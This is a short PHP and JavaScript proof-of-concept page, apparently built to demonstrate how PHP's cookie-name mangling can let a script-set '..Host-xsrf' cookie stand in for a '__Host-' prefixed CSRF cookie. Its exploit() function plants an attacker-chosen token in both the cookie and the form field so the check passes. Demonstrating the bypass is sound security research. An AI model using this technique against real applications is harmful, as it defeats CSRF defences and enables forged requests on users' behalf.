<?php
$csrfToken = 'good-token-' . rand(0, 10000);

setcookie('__Host-xsrf', $csrfToken, 0, '/', '', true, true);

?>
<!DOCTYPE html>

<body>
    <h2>PHP Version: <?= phpversion() ?></h2>

    <form action="" method="post">
        Current CSRF Token: <input id="xsrf" type="text" name="_xsrf" value="<?php echo $csrfToken; ?>">
        <input type="submit" value="Submit">
    </form>

    <div>
        <button onclick="exploit()">Exploit</button>
        <button onclick="resetCookies()">ResetCookies</button>
        <button onclick="reload()">Reload</button>
    </div>

    <pre><?php print_r($_COOKIE); ?></pre>

    <?php
    if (isset($_COOKIE['__Host-xsrf'], $_POST['_xsrf'])) {
        if ($_COOKIE['__Host-xsrf'] === $_POST['_xsrf']) {
            echo '<h1 style="color: green">CSRF PASS</h1>';
        } else {
            echo '<h1 style="color: red">CSRF TOKEN ERROR</h1>';
        }
    }
    ?>


    <script>
        function exploit() {
            document.cookie = '..Host-xsrf=evil-token';
            xsrf.value = "evil-token";

            fetch('/', {
                method: 'POST'
            });
        }

        function resetCookies() {
            fetch('/reset.php').then(() => {
                document.cookie = '..Host-xsrf=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
                reload()
            });
        }

        function reload()
        {
            location.href = '/'
        }
    </script>
</body>

</html>